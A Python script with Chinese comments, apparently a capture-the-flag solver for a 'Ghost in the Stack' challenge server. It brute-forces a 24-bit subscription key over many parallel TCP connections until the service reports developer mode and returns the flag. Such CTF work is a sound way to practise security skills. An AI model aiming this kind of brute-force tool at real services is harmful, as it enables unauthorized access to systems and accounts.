#!/usr/bin/env python3
import socket
import time
import threading
import queue

# 全局变量用于线程间通信
found_key = None
stop_threads = False
result_queue = queue.Queue()

def brute_force_segment(segment_id, start_key, end_key, host, port):
    """在指定范围内暴力破解"""
    global found_key, stop_threads
    
    print(f"[*] 线程 {segment_id}: 开始破解范围 {start_key} - {end_key} (0x{start_key:06x} - 0x{end_key:06x})")
    
    try:
        # 建立独立连接
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        # 接收初始菜单
        initial = s.recv(2048).decode(errors='ignore')
        
        test_count = 0
        for key in range(start_key, end_key + 1):
            # 检查是否需要停止
            if stop_threads or found_key is not None:
                break
                
            test_count += 1
            
            # 每1000个密钥打印一次进度
            if test_count % 1000 == 0:
                progress = ((key - start_key) / (end_key - start_key)) * 100
                print(f"[*] 线程 {segment_id}: 进度 {progress:.1f}% - 测试密钥 {key} (0x{key:06x})")
            
            try:
                # 选择选项1
                s.send(b"1\n")
                time.sleep(0.01)  # 非常短的延迟
                
                # 接收subscription提示
                prompt = s.recv(1024).decode(errors='ignore')
                if "subscription" not in prompt.lower():
                    if "choice" in prompt.lower():
                        continue
                    print(f"[DEBUG] 线程 {segment_id}: 异常提示 - {prompt[:50]}...")
                    break
                
                # 发送密钥
                s.send(f"{key}\n".encode())
                time.sleep(0.01)
                
                # 接收响应
                response = s.recv(2048).decode(errors='ignore')
                
                if "Developer mode activated!" in response:
                    print(f"\n[SUCCESS] 线程 {segment_id} 找到密钥: {key} (0x{key:06x})")
                    print(f"[FLAG] {response}")
                    
                    # 尝试获取更多flag内容
                    time.sleep(0.5)
                    try:
                        additional = s.recv(2048).decode(errors='ignore')
                        if additional.strip():
                            print(f"[FLAG] 额外内容: {additional}")
                    except:
                        pass
                    
                    # 通知其他线程停止
                    found_key = key
                    stop_threads = True
                    result_queue.put((key, response))
                    break
                
                # 检查是否正常回到菜单
                if "Choice:" not in response:
                    print(f"[DEBUG] 线程 {segment_id}: 未回到主菜单，重新连接")
                    break
                    
            except socket.timeout:
                print(f"[ERROR] 线程 {segment_id}: 测试密钥 {key} 超时")
                continue
            except Exception as e:
                print(f"[ERROR] 线程 {segment_id}: 测试密钥 {key} 出错: {e}")
                break
        
        s.close()
        print(f"[*] 线程 {segment_id}: 完成范围 {start_key} - {end_key}")
        
    except Exception as e:
        print(f"[ERROR] 线程 {segment_id}: 连接失败: {e}")

def parallel_brute_force():
    """并行暴力破解"""
    global found_key, stop_threads
    
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    # 重置全局变量
    found_key = None
    stop_threads = False
    
    # 分段设置
    max_value = 0xFFFFFF  # 24位最大值 (16777215)
    num_threads = 8       # 8个线程
    segment_size = max_value // num_threads
    
    print(f"[+] 并行暴力破解设置:")
    print(f"[*] 最大值: {max_value} (0x{max_value:06x})")
    print(f"[*] 线程数: {num_threads}")
    print(f"[*] 每个线程处理: {segment_size} 个密钥")
    
    threads = []
    
    # 创建并启动线程
    for i in range(num_threads):
        start_key = i * segment_size
        end_key = start_key + segment_size - 1
        
        # 最后一个线程处理剩余的值
        if i == num_threads - 1:
            end_key = max_value
        
        thread = threading.Thread(
            target=brute_force_segment,
            args=(i + 1, start_key, end_key, host, port)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()
        
        # 稍微错开线程启动时间，避免同时连接
        time.sleep(0.5)
    
    print(f"[+] 启动了 {len(threads)} 个破解线程")
    
    # 等待结果或所有线程完成
    try:
        while True:
            # 检查是否有结果
            if not result_queue.empty():
                key, response = result_queue.get()
                print(f"\n[FINAL SUCCESS] 找到密钥: {key} (0x{key:06x})")
                print(f"[FINAL FLAG] {response}")
                stop_threads = True
                break
            
            # 检查是否还有活跃线程
            active_threads = [t for t in threads if t.is_alive()]
            if not active_threads:
                print("\n[*] 所有线程已完成")
                break
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[*] 收到中断信号，停止所有线程...")
        stop_threads = True
        
    # 等待所有线程结束
    for thread in threads:
        thread.join(timeout=5)
    
    return found_key

def optimized_parallel_brute_force():
    """优化的并行破解：从可能性较高的范围开始"""
    global found_key, stop_threads
    
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    # 重置
    found_key = None
    stop_threads = False
    
    print("[+] 优化并行破解：优先测试高概率范围")
    
    # 定义优先搜索的范围
    priority_ranges = [
        (0, 10000),           # 小数值
        (0x100000, 0x200000), # 中等范围
        (0x800000, 0x900000), # 较大范围
        (0xF00000, 0xFFFFFF), # 最大范围
    ]
    
    for range_idx, (start, end) in enumerate(priority_ranges):
        print(f"\n[+] 开始搜索优先范围 {range_idx + 1}: 0x{start:06x} - 0x{end:06x}")
        
        num_threads = 4  # 每个范围用4个线程
        segment_size = (end - start + 1) // num_threads
        
        threads = []
        
        for i in range(num_threads):
            seg_start = start + i * segment_size
            seg_end = seg_start + segment_size - 1
            
            if i == num_threads - 1:
                seg_end = end
            
            thread = threading.Thread(
                target=brute_force_segment,
                args=(f"{range_idx + 1}-{i + 1}", seg_start, seg_end, host, port)
            )
            thread.daemon = True
            threads.append(thread)
            thread.start()
            time.sleep(0.3)
        
        # 等待这个范围完成或找到结果
        while True:
            if not result_queue.empty():
                key, response = result_queue.get()
                print(f"\n[FINAL SUCCESS] 密钥: {key} (0x{key:06x})")
                print(f"[FINAL FLAG] {response}")
                stop_threads = True
                return key
            
            active = [t for t in threads if t.is_alive()]
            if not active:
                break
            
            time.sleep(1)
        
        if found_key:
            break
    
    return found_key

if __name__ == "__main__":
    print("[+] Ghost in the Stack - 并行分段暴力破解")
    
    try:
        # 先尝试优化的并行破解
        print("\n=== 优化并行破解 ===")
        result = optimized_parallel_brute_force()
        
        if result is None:
            # 如果没找到，使用完整并行破解
            print("\n=== 完整并行破解 ===")
            result = parallel_brute_force()
        
        if result is not None:
            print(f"\n[COMPLETE] 成功破解! 密钥: {result} (0x{result:06x})")
        else:
            print("\n[-] 破解失败")
            
    except KeyboardInterrupt:
        print("\n[*] 用户中断")